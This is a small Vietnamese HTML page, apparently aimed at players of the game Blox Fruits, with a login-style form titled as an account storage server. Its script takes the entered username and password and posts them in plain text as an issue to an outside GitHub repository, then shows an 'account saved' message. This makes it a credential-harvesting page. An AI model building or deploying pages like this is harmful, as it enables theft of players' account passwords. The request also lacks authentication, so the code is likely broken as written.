<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Server lưu ACC</title>

<style>
body{
font-family:Arial;
background:#0f172a;
color:white;
text-align:center;
}

.box{
background:#1e293b;
padding:20px;
width:300px;
margin:auto;
border-radius:10px;
}

input{
width:90%;
padding:8px;
margin:5px;
}

button{
padding:8px 15px;
background:#22c55e;
border:none;
color:white;
cursor:pointer;
}
</style>

</head>

<body>

<h2>Nhập Tài Khoản</h2>

<div class="box">

<input id="user" placeholder="Tài khoản"><br>
<input id="pass" placeholder="Mật khẩu"><br>

<button onclick="save()">Lưu</button>

</div>

<script>

function save(){

let user=document.getElementById("user").value
let pass=document.getElementById("pass").value

fetch("https://api.github.com/repos/phone-creat/blox-fruit/issues",{

method:"POST",

headers:{
"Accept":"application/vnd.github+json",
"Content-Type":"application/json"
},

body:JSON.stringify({
title:"ACC "+user,
body:"User: "+user+" Pass: "+pass
})

})

alert("Đã lưu tài khoản")

}

</script>

</body>
</html>
